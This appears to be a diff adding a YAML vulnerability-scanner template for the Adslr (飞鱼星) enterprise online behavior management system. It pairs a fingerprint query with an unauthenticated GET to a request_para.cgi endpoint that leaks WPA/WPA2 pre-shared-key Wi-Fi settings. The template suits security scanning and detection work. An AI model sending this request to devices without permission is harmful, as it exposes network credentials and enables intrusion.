@@ -1,0 +1,18 @@
+name: Adslr Enterprise online behavior management system Information leak
+manual: true
+query: title="飞鱼星企业级智能上网行为管理系统"
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /request_para.cgi?parameter=wifi_get_5g_host
+    expression: response.status == 200 && response.body.bcontains(b"WPA-PSK")
+  r1:
+    request:
+      method: GET
+      path: /request_para.cgi?parameter=wifi_get_5g_host
+    expression: response.status == 200 && response.body.bcontains(b"WPA2-PSK")
+expression: r0() || r1()
+detail:
+  tags: infoleak
